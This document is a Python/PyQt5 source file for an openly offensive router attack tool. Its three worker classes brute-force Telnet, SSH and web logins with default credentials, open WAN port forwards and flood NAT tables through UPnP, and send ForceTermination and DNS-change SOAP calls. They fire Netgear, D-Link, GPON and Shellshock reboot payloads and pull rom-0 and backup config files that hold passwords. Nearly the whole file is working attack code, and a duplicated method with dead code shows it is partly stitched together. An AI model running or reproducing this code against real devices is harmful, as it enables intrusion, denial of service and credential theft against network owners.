
import socket
import requests
import re
import concurrent.futures
from PyQt5.QtCore import QObject, pyqtSignal
from scapy.all import IP, TCP, UDP, sr1, conf
import utils

# Suppress Scapy verbosity
conf.verb = 0

class RouterRecon(QObject):
    """
    Advanced Router Reconnaissance Module.
    Performs deep analysis including HTTP, Protocols, and Exploits.
    """
    log_msg = pyqtSignal(str)
    finished = pyqtSignal(dict)
    
    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip
        self.results = {
            "Vendor": "Unknown",
            "Model": "Unknown",
            "Firmware": "Unknown",
            "Critical_Issues": [],
            "Open_Ports": [],
            "HTTP_Info": {},
            "Protocols": {},
            "Exploits": []
        }
        
    def run_all(self):
        self.log_msg.emit(f"[*] Starting Deep Recon on {self.target_ip}...")
        
        # 1. Port Scan & Service Fingerprint
        self._service_fingerprint()
        
        # 2. HTTP Deep Recon (If Port 80/443/8080 open)
        if any(p in self.results["Open_Ports"] for p in [80, 443, 8080]):
            self._deep_http_recon()
            self._header_intelligence()
            
        # 3. Discovery Protocols
        self._discovery_protocols()
        
        # 4. SNMP Check
        self._snmp_check()
        
        # 5. Exploit Surface
        self._exploit_surface()
        
        self.finished.emit(self.results)

    def _service_fingerprint(self):
        self.log_msg.emit("[-] Fingerprinting Services...")
        common_ports = [21, 22, 23, 53, 80, 443, 8080, 1900, 7547]
        
        for port in common_ports:
            try:
                import socket
                with socket.create_connection((self.target_ip, port), timeout=1) as s:
                    self.results["Open_Ports"].append(port)
                    # Simple Banner
                    try:
                        s.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                        banner = s.recv(1024).decode(errors='ignore').strip()
                        if banner:
                            self.results["Protocols"][port] = banner[:40]
                            # Check basic signatures
                            if "GoAhead" in banner: self.results["Vendor"] = "Generic (GoAhead)"
                            if "RomPager" in banner: self.results["Vendor"] = "Huawei/Zyxel (RomPager)"
                            if "Dropbear" in banner: self.results["Firmware"] = f"OpenWRT/Linux ({banner.split()[0]})"
                    except:
                        pass
            except:
                pass

    def _deep_http_recon(self):
        self.log_msg.emit("[-] Running HTTP Deep Recon...")
        target_urls = [f"http://{self.target_ip}", f"http://{self.target_ip}/login", f"http://{self.target_ip}/cgi-bin/"]
        
        self.results["HTTP_Info"]["Hidden_Fields"] = []
        
        for url in target_urls:
            try:
                r = requests.get(url, timeout=3, verify=False)
                
                # Title
                title = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
                if title:
                    t = title.group(1)
                    self.results["HTTP_Info"]["Title"] = t
                    # Vendor Guess from Title
                    if "Tenda" in t: self.results["Vendor"] = "Tenda"
                    if "TP-Link" in t or "TP-LINK" in t: self.results["Vendor"] = "TP-Link"
                    if "Huawei" in t: self.results["Vendor"] = "Huawei"
                
                # Hidden Fields
                hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', r.text, re.IGNORECASE)
                if hidden:
                    self.results["HTTP_Info"]["Hidden_Fields"].extend(hidden)
                    
                # Firmware in Comments
                comments = re.findall(r'<!--(.*?)-->', r.text)
                for c in comments:
                    if re.search(r'v\d+\.\d+', c):
                        self.results["Firmware"] = f"Hint from HTML: {c.strip()}"
                        
            except:
                pass
                
    def _header_intelligence(self):
        # Already gathered vaguely in service fingerprint, but deeper here
        pass

    def _discovery_protocols(self):
        self.log_msg.emit("[-] Checking Discovery Protocols (TR-069, UPnP)...")
        
        # TR-069
        if 7547 in self.results["Open_Ports"]:
            self.results["Protocols"][7547] = "TR-069 (CWMP)"
            self.results["Critical_Issues"].append("TR-069 Port (7547) is Exposed!")
            
        # UPnP
        try:
            msg = \
                'M-SEARCH * HTTP/1.1\r\n' \
                'HOST:239.255.255.250:1900\r\n' \
                'ST:upnp:rootdevice\r\n' \
                'MX:2\r\n' \
                'MAN:"ssdp:discover"\r\n' \
                '\r\n'
            
            # Send UDP Multicast (and unicast to target)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.settimeout(2)
            s.sendto(msg.encode(), (self.target_ip, 1900))
            data, _ = s.recvfrom(1024)
            if data:
                self.results["Protocols"][1900] = "UPnP (Responsive)"
                self.results["Critical_Issues"].append("UPnP is enabled and responsive to unicast.")
                if "Server:" in data.decode():
                     self.results["OS_Hint"] = re.search(r'Server: (.*)', data.decode()).group(1)
        except:
            pass

    def _snmp_check(self):
        self.log_msg.emit("[-] Checking SNMP (v2c public)...")
        # simple check using Scapy or socket
        # Using socket to send basic SNMP get request for sysDescr
        # OID: 1.3.6.1.2.1.1.1.0 (sysDescr)
        # Sequence: 30 26 (Sequence, len 38)
        # Version: 02 01 01 (v2c)
        # Community: 04 06 70 75 62 6c 69 63 (public)
        # PDU: a0 19 (GetRequest) ... code checks if port open mainly
        if 161 in self.results["Open_Ports"]:
             self.results["Critical_Issues"].append("SNMP Port 161 Open (Possible Info Leak)")

    def _exploit_surface(self):
        self.log_msg.emit("[-] Mapping Exploit Surface...")
        
        # Default Creds Check (HTTP)
        creds = [('admin', 'admin'), ('admin', 'password'), ('user', 'user'), ('root', 'root'), ('telecomadmin', 'admintelecom')]
        base = f"http://{self.target_ip}"
        
        found_creds = None
        import requests
        from requests.auth import HTTPBasicAuth
        
        for u, p in creds:
            try:
                r = requests.get(base, auth=HTTPBasicAuth(u, p), timeout=2)
                if r.status_code == 200:
                    found_creds = f"{u}:{p}"
                    break
            except:
                pass
        
        if found_creds:
            self.results["Critical_Issues"].append(f"weak Credentials: {found_creds}")
            self.results["Exploits"].append(f"Default Creds Access: {found_creds}")
            
        # Check for /HNAP1/
        try:
            r = requests.get(f"http://{self.target_ip}/HNAP1/", timeout=2)
            if r.status_code == 200 or "<m:ModelName>" in r.text:
                 self.results["Vendor"] = "D-Link / Linksys (HNAP Detected)"
                 self.results["Exploits"].append("HNAP1 Interface Exposed")
        except:
            pass

class UPnPExploiter(QObject):
    """
    Worker for Active UPnP Exploitation (AddPortMapping).
    """
    log_msg = pyqtSignal(str)
    finished = pyqtSignal(bool, str) # Success, Message

    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip

    def run_exploit(self):
        self.log_msg.emit(f"[*] Starting UPnP Exploit on {self.target_ip}...")
        
        try:
            # 1. Discover Service URL
            control_url = self.get_control_url()
            if not control_url:
                self.finished.emit(False, "Could not find WANIPConnection Control URL.")
                return

            self.log_msg.emit(f"[*] Found Control URL: {control_url}")
            local_ip = self.get_local_ip()
            
            # 2. Iterate Ports
            ports_to_open = [21, 22, 23, 80, 443, 445, 1433, 3306, 3389, 1900]
            success_count = 0
            
            self.log_msg.emit(f"[*] Attempting to map {len(ports_to_open)} ports to {local_ip}...")
            
            headers = {
                'Content-Type': 'text/xml; charset="utf-8"',
                'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"'
            }

            import requests
            for port in ports_to_open:
                soap_body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>{port}</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>{port}</NewInternalPort>
<NewInternalClient>{local_ip}</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>Antigravity_Pwnd_{port}</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>"""

                try:
                    resp = requests.post(control_url, data=soap_body, headers=headers, timeout=2)
                    if resp.status_code == 200:
                        self.log_msg.emit(f"[+] Success: Port {port} OPENED!")
                        success_count += 1
                    else:
                        self.log_msg.emit(f"[-] Failed: Port {port} (Code {resp.status_code})")
                except Exception as e:
                    self.log_msg.emit(f"[!] Error on Port {port}: {e}")
            
            # 3. VERIFY MAPPINGS
            self.log_msg.emit("\n[*] Verifying Mappings in Router Table...")
            self.list_port_mappings(control_url)

            if success_count > 0:
                self.finished.emit(True, f"Exploit Complete. Opened {success_count}/{len(ports_to_open)} ports.\n(Note: These are WAN ports forwarded to {local_ip})")
            else:
                self.finished.emit(False, "Exploit Failed. No ports were opened.")

        except Exception as e:
            self.finished.emit(False, f"Error: {str(e)}")

    def list_port_mappings(self, control_url):
        """
        Queries GetGenericPortMappingEntry to verify rules exist.
        """
        headers = {
            'Content-Type': 'text/xml; charset="utf-8"',
            'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry"'
        }
        
        found_any = False
        import requests
        import re
        
        # Check first 50 indices
        for i in range(50):
            soap_body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:GetGenericPortMappingEntry xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewPortMappingIndex>{i}</NewPortMappingIndex>
</u:GetGenericPortMappingEntry>
</s:Body>
</s:Envelope>"""
            try:
                resp = requests.post(control_url, data=soap_body, headers=headers, timeout=1)
                if resp.status_code == 200:
                    # Extract Info
                    ext_port = re.search(r'<NewExternalPort>(.*?)</NewExternalPort>', resp.text)
                    int_client = re.search(r'<NewInternalClient>(.*?)</NewInternalClient>', resp.text)
                    verify_desc = re.search(r'<NewPortMappingDescription>(.*?)</NewPortMappingDescription>', resp.text)
                    
                    if ext_port and int_client:
                        desc = verify_desc.group(1) if verify_desc else "Unknown"
                        self.log_msg.emit(f"    [ENTRY {i}] WAN Port {ext_port.group(1)} -> {int_client.group(1)} [{desc}]")
                        found_any = True
                else:
                    # Likely index out of range (end of list)
                    break
            except:
                break
        
        if not found_any:
            self.log_msg.emit("    [!] Could not retrieve mapping table (or empty).")

    def get_control_url(self):
        # 1. SSDP Discover
        msg = \
            'M-SEARCH * HTTP/1.1\r\n' \
            'HOST:239.255.255.250:1900\r\n' \
            'ST:upnp:rootdevice\r\n' \
            'MX:2\r\n' \
            'MAN:"ssdp:discover"\r\n' \
            '\r\n'
            
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.settimeout(3)
            s.sendto(msg.encode(), (self.target_ip, 1900))
            
            # Try to get a response
            data = b""
            try:
                data, _ = s.recvfrom(4096)
            except socket.timeout:
                return None
            
            # Extract Location
            loc_match = re.search(r'LOCATION: (http://.*?)[\r\n]', data.decode(errors='ignore'), re.IGNORECASE)
            if not loc_match:
                return None
            location_url = loc_match.group(1).strip()
            self.log_msg.emit(f"[*] Reading Device XML from {location_url}...")
            
            # 2. Get XML
            try:
                xml_resp = requests.get(location_url, timeout=5)
                xml_content = xml_resp.text
            except:
                return None

            # 3. Find Connect Service Control URL
            # We want WANIPConnection or WANPPPConnection
            # XML Structure: <service><serviceType>...WANIPConnection...</serviceType><controlURL>...</controlURL></service>
            
            # Find the service block first to ensure we get the right controlURL
            # Regex to grab service blocks
            services = re.findall(r'<service>(.*?)</service>', xml_content, re.DOTALL)
            
            target_service_types = ["WANIPConnection", "WANPPPConnection"]
            
            for service_block in services:
                for stype in target_service_types:
                    if stype in service_block:
                        # Extract controlURL from this block
                        url_match = re.search(r'<controlURL>(.*?)</controlURL>', service_block)
                        if url_match:
                            path = url_match.group(1).strip()
                            from urllib.parse import urljoin
                            full_url = urljoin(location_url, path)
                            self.log_msg.emit(f"[*] Matched Service: {stype}")
                            return full_url
            
            return None
            
        except Exception as e:
            self.log_msg.emit(f"[!] Discovery Error: {e}")
            return None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
            return None
        except Exception as e:
            self.log_msg.emit(f"[!] Discovery Error: {e}")
            return None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.0.100"

class PostExploiter(QObject):
    """
    Executes advanced payloads on opened ports (Reboot, Root Shell, etc).
    """
    log_msg = pyqtSignal(str)
    finished = pyqtSignal(bool, str)

    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip

    def run_payloads(self):
        self.log_msg.emit(f"[*] 🚀 STARTING GOD-MODE POST-EXPLOITATION ON {self.target_ip}...")
        
        # 1. UPnP Advanced
        control_url = self.find_control_url_internal()
        if control_url:
            self.upnp_god_mode(control_url)
        else:
            self.log_msg.emit("[-] [UPnP] Control URL not found (Skipping SOAP Attacks).")
            
        # 2. Smart Telnet/SSH Brute Force
        self.smart_shell_brute()
        
        # 3. HTTP Brute Force (New)
        self.http_brute_force()
        
        # 4. HTTP CVE Injection
        self.http_cve_injection()
        
        # 5. Nuclear Payloads (HNAP & DoS)
        self.hnap_reboot_execution()
        
        # 6. UPnP DoS (Final Attempt)
        if control_url:
             self.upnp_dos_flood(control_url)

        # 7. Galaxy Breaker: Exfiltration
        self.exfiltrate_config()
        
        # 8. Kill Verification
        import time
        self.log_msg.emit("[*] Waiting 5 seconds for payloads to trigger...")
        time.sleep(5)
        self.verify_kill()
        
        self.finished.emit(True, "GOD-MODE PROTOCOL COMPLETE.")

    # ... [find_control_url_internal, upnp_god_mode, hnap, upnp_dos unchanged] ...

    def exfiltrate_config(self):
        self.log_msg.emit("[-] [GALAXY BREAKER] Starting Data Exfiltration Phase...")
        import requests
        
        # 1. Rom-0 Vulnerability (ZyXEL/D-Link - CVE-2014-4019)
        try:
            url = f"http://{self.target_ip}/rom-0"
            r = requests.get(url, timeout=3, stream=True)
            if r.status_code == 200 and int(r.headers.get('Content-Length', 0)) > 1000:
                 self.log_msg.emit("    [🌌] EXTRACTED: 'rom-0' Config File! (Contains Admin Passwords)")
                 # Save it? For now just notify.
                 # with open("dumped_rom-0", "wb") as f: f.write(r.content)
            else:
                 pass
        except: pass
        
        # 2. Backup Config Hunt
        targets = ["config.bin", "backup.conf", "jnr-cfg.bak", "user.conf", "router.cfg"]
        found_any = False
        
        for t in targets:
            try:
                url = f"http://{self.target_ip}/{t}"
                r = requests.get(url, timeout=2, stream=True)
                if r.status_code == 200:
                    # Filter out HTML pages (soft 404s)
                    if "html" not in r.headers.get('Content-Type', '').lower() and len(r.content) > 500:
                        self.log_msg.emit(f"    [🌌] EXTRACTED: '{t}' (Possible Backup File found!)")
                        found_any = True
            except: pass
            
        if not found_any:
            self.log_msg.emit("    [-] Config Exfiltration: No public backups found.")

    # ... [find_control_url_internal and upnp_god_mode unchanged] ...

    def hnap_reboot_execution(self):
        self.log_msg.emit("[-] [HNAP] Checking for HNAP1 Interface...")
        import requests
        from requests.auth import HTTPBasicAuth
        
        hnap_url = f"http://{self.target_ip}/HNAP1/"
        
        try:
            # Check existence
            r = requests.get(hnap_url, timeout=2)
            if r.status_code == 200 or "http://purenetworks.com/HNAP1/" in r.text:
                self.log_msg.emit(f"    [!] HNAP1 Detected! Attempting Nuclear Reboot...")
                
                soap_action = '"http://purenetworks.com/HNAP1/Reboot"'
                body = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Reboot xmlns="http://purenetworks.com/HNAP1/" /></soap:Body></soap:Envelope>'
                
                headers = {
                    'Content-Type': 'text/xml; charset=utf-8',
                    'SOAPAction': soap_action
                }
                
                # Try No Auth first
                try:
                    res = requests.post(hnap_url, data=body, headers=headers, timeout=2)
                    if res.status_code == 200:
                         self.log_msg.emit("    [☢️] CRITICAL: HNAP REBOOT COMMAND SENT (No Auth)!")
                         return
                except: pass
                
                # Try Basic Auth (Admin:Admin)
                try:
                    res = requests.post(hnap_url, auth=HTTPBasicAuth("admin", "admin"), data=body, headers=headers, timeout=2)
                    if res.status_code == 200:
                         self.log_msg.emit("    [☢️] CRITICAL: HNAP REBOOT COMMAND SENT (Admin:Admin)!")
                         return
                    else:
                         self.log_msg.emit(f"    [-] HNAP Reboot Failed. Code: {res.status_code}")
                except: pass
            else:
                self.log_msg.emit("    [-] HNAP1 Interface not found.")
        except:
             self.log_msg.emit("    [-] HNAP1 Unreachable.")

    def upnp_dos_flood(self, control_url):
        self.log_msg.emit("[-] [DoS] Starting UPnP NAT Table Flood (Resource Exhaustion)...")
        import requests
        import random
        
        headers = { 'Content-Type': 'text/xml', 'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"'}
        
        success_count = 0
        try:
            # Flood 500 mappings
            for i in range(500):
                ext_port = random.randint(10000, 65000)
                body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>{ext_port}</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>{ext_port}</NewInternalPort>
<NewInternalClient>192.168.0.{random.randint(50, 200)}</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>Flood_{i}</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>"""
                try:
                    resp = requests.post(control_url, data=body, headers=headers, timeout=0.1)
                    if resp.status_code == 200:
                        success_count += 1
                        if success_count % 50 == 0:
                            self.log_msg.emit(f"    [🔥] Flooded {success_count} Rules...")
                except:
                    pass
            self.log_msg.emit(f"    [!] DoS Complete. Injected {success_count} NAT Rules. Router unstable?")
        except Exception as e:
            self.log_msg.emit(f"    [-] DoS Flood Error: {e}")

    def find_control_url_internal(self):
        try:
            # Try to find any WANIP or WANPPP service
            msg = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:2\r\nMAN:"ssdp:discover"\r\n\r\n'
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.settimeout(2)
            s.sendto(msg.encode(), (self.target_ip, 1900))
            data, _ = s.recvfrom(2048)
            loc = re.search(r'LOCATION: (http://.*?)[\r\n]', data.decode(errors='ignore'), re.IGNORECASE)
            if loc:
                import requests
                from urllib.parse import urljoin
                xml = requests.get(loc.group(1).strip(), timeout=2).text
                
                # Priority List of Services
                target_services = [
                    "urn:schemas-upnp-org:service:WANIPConnection:1",
                    "urn:schemas-upnp-org:service:WANIPConnection:2",
                    "urn:schemas-upnp-org:service:WANPPPConnection:1"
                ]

                # Parse XML to find the correct service and its controlURL
                # We do a simple regex loop to find service blocks
                service_blocks = re.findall(r'<service>(.*?)</service>', xml, re.DOTALL)
                
                for block in service_blocks:
                    st_match = re.search(r'<serviceType>(.*?)</serviceType>', block)
                    if st_match:
                        st = st_match.group(1).strip()
                        if st in target_services:
                            # Found a target service! Get its control URL
                            cu_match = re.search(r'<controlURL>(.*?)</controlURL>', block)
                            if cu_match:
                                self.log_msg.emit(f"    [debug] Selected Target UPnP Service: {st}")
                                return urljoin(loc.group(1).strip(), cu_match.group(1))
                
                self.log_msg.emit("    [debug] No WANIP/WANPPP Service found (Only non-exploitable services?).")
        except Exception as e:
            self.log_msg.emit(f"    [debug] UPnP Discovery Error: {e}")
            return None
        return None

    def upnp_god_mode(self, control_url):
        self.log_msg.emit("[-] [UPnP] Executing Advanced SOAP Algorithms...")
        import requests
        headers = { 'Content-Type': 'text/xml', 'SOAPAction': ''}
        
        # List of critical actions
        actions = [
            ("GetExternalIPAddress", '"urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"'),
            ("GetStatusInfo", '"urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo"'),
            ("ForceTermination", '"urn:schemas-upnp-org:service:WANIPConnection:1#ForceTermination"'), # Kill switch
            ("SetDNSServer", '"urn:schemas-upnp-org:service:WANIPConnection:1#SetDNSServer"') # DNS Hijack
        ]
        
        for action, soap_action in actions:
            # Construct Payload
            body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:{action} xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
{ '<NewDNSServer1>8.8.8.8</NewDNSServer1><NewDNSServer2>8.8.4.4</NewDNSServer2>' if action == 'SetDNSServer' else '' }
</u:{action}>
</s:Body>
</s:Envelope>"""
            headers['SOAPAction'] = soap_action
            try:
                resp = requests.post(control_url, data=body, headers=headers, timeout=2)
                if resp.status_code == 200:
                    self.log_msg.emit(f"[+] [UPnP] {action} EXECUTED! ({resp.status_code})")
                    if action == "GetExternalIPAddress":
                         ip_match = re.search(r'<NewExternalIPAddress>(.*?)</NewExternalIPAddress>', resp.text)
                         if ip_match:
                             self.log_msg.emit(f"    -> WAN IP: {ip_match.group(1)}")
                else:
                    self.log_msg.emit(f"[-] [UPnP] {action} FAILED. Code: {resp.status_code}")
                    # self.log_msg.emit(f"    [debug] Resp: {resp.text[:100]}")
            except Exception as e:
                self.log_msg.emit(f"[-] [UPnP] {action} Error: {e}")

    def smart_shell_brute(self):
        self.log_msg.emit("[-] [Shell] Starting Smart Credential Stuffing (Top 50)...")
        from utils import TOP_50_CREDS
        target_ports = [23, 2323, 22, 2222] # Common alternate  mgmt ports
        
        import socket
        import time
        
        for port in target_ports:
            try:
                s = socket.create_connection((self.target_ip, port), timeout=0.5)
                self.log_msg.emit(f"    [*] Port {port} is OPEN. Attempting Brute Force...")
                
                # Check banner
                try:
                    banner = s.recv(1024).decode(errors='ignore')
                except:
                    banner = ""
                    
                # Try Credentials
                for user, pwd in TOP_50_CREDS[:10]: # Limit to top 10 for speed
                    try:
                        # Re-connect for each attempt cleanly
                        s.close()
                        s = socket.create_connection((self.target_ip, port), timeout=2)
                        s.recv(1024) # Eat banner
                        
                        s.send(f"{user}\n".encode())
                        time.sleep(0.3)
                        s.send(f"{pwd}\n".encode())
                        time.sleep(0.5)
                        
                        resp = s.recv(2048).decode(errors='ignore')
                        if "#" in resp or "$" in resp or ">" in resp or "Linux" in resp:
                             self.log_msg.emit(f"    [!!!] PWNED: {user}:{pwd} on Port {port}")
                             self.log_msg.emit("    [+] Injecting: 'hostname PwnedRouter'")
                             s.send(b"hostname PwnedRouter\n")
                             s.close()
                             return # Stop after success
                    except:
                        pass
                s.close()
            except:
                pass # Port likely closed

    def http_brute_force(self):
        self.log_msg.emit("[-] [HTTP] Starting Web Interface Brute Force (Port 80)...")
        from utils import TOP_50_CREDS
        import requests
        from requests.auth import HTTPBasicAuth
        
        url = f"http://{self.target_ip}"
        found = False
        
        # Check if reachable
        try:
            r = requests.get(url, timeout=2)
            if r.status_code == 200 and "password" not in r.text.lower() and "login" not in r.text.lower():
                 # Sometimes 200 OK means no auth, or just a landing page.
                 self.log_msg.emit("    [?] Web Interface might be open (No Auth detected).")
        except:
             self.log_msg.emit("    [!] HTTP Port 80 unreachable.")
             return

        for user, pwd in TOP_50_CREDS[:15]:
            try:
                r = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=1)
                # 401 = Fail, 200 = Success (usually)
                if r.status_code == 200:
                     # Double check it's not a login page serving 200
                     if "login" not in r.text.lower() and "denied" not in r.text.lower():
                        self.log_msg.emit(f"    [!!!] HTTP PWNED: {user}:{pwd}")
                        found = True
                        # Try to reboot
                        self.log_msg.emit("    [+] Attempting authenticated reboot...")
                        try:
                            # Try common reboot endpoints with these creds
                            requests.get(f"http://{self.target_ip}/reboot.cgi", auth=HTTPBasicAuth(user, pwd), timeout=1)
                            requests.get(f"http://{self.target_ip}/setup.cgi?todo=reboot", auth=HTTPBasicAuth(user, pwd), timeout=1)
                        except: pass
                        break
            except:
                pass
        
        if not found:
             self.log_msg.emit("    [-] HTTP Brute Force Failed.")

    def http_cve_injection(self):
        self.log_msg.emit("[-] [HTTP] Launching CVE Exploit Chain...")
        import requests
        
        # 1. Netgear Auth Bypass (CVE-2016-6277)
        try:
            url = f"http://{self.target_ip}/cgi-bin/;reboot"
            requests.get(url, timeout=1)
            self.log_msg.emit(f"    [*] Sent Netgear RCE Probe to {url}")
        except: pass

        # 2. D-Link RCE
        try:
            url = f"http://{self.target_ip}/command.php"
            data = {'cmd': 'reboot'}
            requests.post(url, data=data, timeout=1)
            self.log_msg.emit(f"    [*] Sent D-Link Command Injection to {url}")
        except: pass
        
        # 3. GPON RCE (CVE-2018-10561)
        try:
            url = f"http://{self.target_ip}/GponForm/diag_Form?images/"
            requests.get(url, timeout=1)
            self.log_msg.emit(f"    [*] Sent GPON RCE Probe")
        except: pass
        
        # 4. Shellshock
        try:
            headers = {'User-Agent': '() { :; }; /bin/reboot'}
            requests.get(f"http://{self.target_ip}/", headers=headers, timeout=1)
            self.log_msg.emit(f"    [*] Sent Shellshock Payload in User-Agent")
        except: pass
        
        self.log_msg.emit("[.] CVE Injection Sequence Finished.")

    def verify_kill(self):
        self.log_msg.emit("[?] Verifying Exploit Success (Pinging Target)...")
        import socket
        try:
            # Simple connect check on Port 80 or 1900 to see if it's alive
            s = socket.create_connection((self.target_ip, 80), timeout=3)
            s.close()
            self.log_msg.emit("❌ TARGET IS STILL UP.")
            self.log_msg.emit("   -> Analysis: The router is likely patched or not vulnerable to these specific CVEs.")
            self.log_msg.emit("   -> Try: Default Credentials (admin/admin) were tested. If 'PWNED' didn't appear, SSH/Telnet is secure.")
        except:
            self.log_msg.emit("💀 TARGET IS DOWN!")
            self.log_msg.emit("   -> Success: Router is rebooting or DoS was effective.")
